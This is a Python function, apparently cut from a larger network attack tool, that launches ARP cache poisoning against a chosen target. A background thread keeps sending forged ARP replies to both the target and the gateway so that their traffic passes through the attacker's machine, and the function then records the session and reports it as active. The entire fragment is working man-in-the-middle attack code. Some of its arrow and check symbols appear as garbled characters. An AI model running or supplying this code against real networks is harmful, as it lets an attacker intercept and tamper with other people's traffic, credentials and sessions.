def _mitm_start(target_ip: str, target_mac: str):
    """Start ARP poison loop for target_ip в†” GATEWAY_IP."""
    if target_ip in _mitm_sessions:
        console.print(f"[yellow]MITM already active for {target_ip}[/]"); return
    stop_ev = threading.Event()

    def _loop():
        while not stop_ev.is_set():
            try:
                # target в†ђ "gateway is at our MAC"
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                         psrc=GATEWAY_IP), verbose=False, iface=IFACE)
                # gateway в†ђ "target is at our MAC"
                send(ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC,
                         psrc=target_ip), verbose=False, iface=IFACE)
            except Exception:
                pass
            time.sleep(1.5)

    t = threading.Thread(target=_loop, daemon=True)
    t.start()
    _mitm_sessions[target_ip] = {"stop_ev": stop_ev, "thread": t,
                                  "target_mac": target_mac}
    LED.mitm_alert()
    console.print(f"[yellow][вњ“] MITM started в†’ [bold]{target_ip}[/bold][/]")

